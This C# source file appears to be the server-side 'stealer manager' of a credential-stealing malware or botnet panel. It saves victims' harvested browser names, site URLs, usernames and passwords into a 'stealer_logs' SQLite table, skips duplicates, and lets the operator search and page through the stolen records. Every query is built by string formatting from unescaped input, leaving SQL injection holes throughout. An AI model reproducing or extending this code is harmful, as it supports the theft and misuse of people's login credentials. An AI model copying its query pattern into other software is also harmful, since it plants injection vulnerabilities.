using System;
using System.Data.SQLite;
using System.Text;
using Server.Core.Config;
using Server.Utilities;

namespace Server.Core.Handlers
{
	/// <summary>
	/// Description of CStealerManager.
	/// </summary>
	public static class CStealerManager
	{
		public static int GetTotal(string strTag)
		{
			try
			{
                string strQuery = string.IsNullOrEmpty(strTag) ? "SELECT COUNT(*) FROM stealer_logs" : string.Format(
                    "SELECT COUNT(*) FROM stealer_logs WHERE steal_browser LIKE '%{0}%' OR steal_url LIKE '%{0}%' OR steal_username LIKE '%{0}%' OR steal_password LIKE '%{0}%'",
                    strTag);

				return CMain.DatabaseClient.ExecuteCountQuery(strQuery);
			}
			catch {}
			return 0;
		}

        static bool Exists(string strURL, string strUsername, string strPassword)
        {
            try
            {
                int iCount = CMain.DatabaseClient.ExecuteCountQuery(
                    string.Format(
                    "SELECT COUNT(*) FROM stealer_logs WHERE steal_url='{0}' and steal_username='{1}' and steal_password='{2}'",
                    strURL, strUsername, strPassword)
                    );

                return iCount > 0;
            }
            catch { }

            return false;
        }

		public static void Add(string strBrowser, string strURL, string strUsername, string strPassword)
		{
            if (Exists(strURL, strUsername, strPassword)) return;

			try
			{
                CMain.DatabaseClient.ExecuteNonResultQuery(
                    string.Format(
                    "INSERT INTO stealer_logs(steal_browser, steal_url, steal_username, steal_password) VALUES('{0}', '{1}', '{2}', '{3}')",
                    strBrowser, strURL, strUsername, strPassword)
                    );
			}
			catch {}
		}
		
		public static string GetPage(int iPage, string strTag)
		{
			try
			{
                string strQuery = "SELECT * FROM stealer_logs";

                if(!String.IsNullOrEmpty(strTag))
                {
                    strQuery += string.Format(" WHERE steal_browser LIKE '%{0}%' OR steal_url LIKE '%{0}%' OR steal_username LIKE '%{0}%' OR steal_password LIKE '%{0}%'", strTag);
                }

                strQuery += string.Format(" LIMIT {0}, {1}", (iPage - 1) * CConfig.ResultsPerPage, CConfig.ResultsPerPage);
                
                SQLiteDataReader Result = CMain.DatabaseClient.ExecuteReadQuery(strQuery);
				
				if(Result.HasRows)
				{
                    var sbStealerList = new StringBuilder();
					
                    while(Result.Read())
					{
                        sbStealerList.AppendFormat(
                            "{0}*{1}*{2}*{3};",
                            Result["steal_browser"].ToString(), Result["steal_url"].ToString(), Result["steal_username"].ToString(), Result["steal_password"].ToString());
					}

                    return sbStealerList.ToString();
				}
			}
			catch {}
			return string.Empty;
		}
	}
}
